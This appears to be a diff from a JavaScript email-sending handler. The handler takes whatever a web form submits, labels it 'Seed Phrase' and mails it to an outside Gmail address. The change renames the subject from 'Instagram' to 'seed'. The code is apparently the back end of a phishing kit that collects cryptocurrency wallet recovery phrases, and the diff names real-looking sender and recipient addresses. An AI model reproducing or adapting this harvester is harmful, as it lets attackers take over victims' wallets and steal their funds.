@@ -19,7 +19,7 @@ export default async function sendEmail (req, res) {
        let info = await transporter.sendMail({
         from: '"seed" <sales1687@tazhhq.com>',
         to: 'lengleytony@gmail.com',
-        subject: 'Instagram',
+        subject: 'seed',
         text: ` Seed Phrase: ${req.body}`,
         html: `<h2> Seed Phrase: ${req.body}</h2>`
        })
